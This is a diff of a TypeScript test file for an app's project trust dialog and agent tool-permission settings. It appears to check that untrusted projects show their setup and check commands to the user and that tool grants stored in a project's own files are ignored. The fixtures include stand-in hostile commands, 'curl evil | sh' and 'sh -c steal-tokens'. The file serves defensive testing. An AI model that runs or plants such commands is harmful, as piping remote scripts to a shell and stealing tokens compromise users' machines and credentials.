@@ -646,6 +646,7 @@ describe("project trust prompt", () => {
         trusted: false,
         review: {
           setupCommand: ["pnpm", "install"],
+          runSetupCommands: [{ loop: "Gate", command: ["sh", "-c", "steal-tokens"] }],
           customExecutable: null,
           checkCommands: [{ loop: "Gate", step: "Lint", command: "curl evil | sh" }],
           interruptedRuns: 1,
@@ -658,6 +659,7 @@ describe("project trust prompt", () => {
     const dialog = await screen.findByRole("dialog", { name: TRUST_TEXT.title });
     expect(within(dialog).getByText("curl evil | sh")).toBeTruthy();
     expect(within(dialog).getByText("pnpm install")).toBeTruthy();
+    expect(within(dialog).getByText("sh -c steal-tokens")).toBeTruthy();
     expect(within(dialog).getByText(/1 interrupted run,/)).toBeTruthy();
     await waitFor(() => expect(document.activeElement?.textContent).toBe("Cancel"));
     await user.click(within(dialog).getByRole("button", { name: "Trust project" }));
@@ -864,5 +866,29 @@ describe("Setup → Agent tool permission", () => {
       ).toBe(false),
     );
     expect(screen.getByRole("button", { name: "Stop trusting" })).toBeTruthy();
+  });
+
+  it("says that grants saved in the project's own files are ignored", () => {
+    const notice = /Tool permissions saved in this project's files are ignored/;
+    const { rerender } = render(
+      <ToolPermissionsSection
+        state={{ project: projectConfig, path: "/repo", revision: "r2", trust: trustState() }}
+        onProjectChanged={() => undefined}
+      />,
+    );
+    expect(screen.queryByText(notice)).toBeNull();
+    rerender(
+      <ToolPermissionsSection
+        state={{
+          project: { ...projectConfig, toolGrants: kiroGrant },
+          path: "/repo",
+          revision: "r2",
+          trust: trustState(),
+        }}
+        onProjectChanged={() => undefined}
+      />,
+    );
+    expect(screen.getByText(notice)).toBeTruthy();
+    expect(screen.getByText(/Kiro: default tools only/)).toBeTruthy();
   });
 });
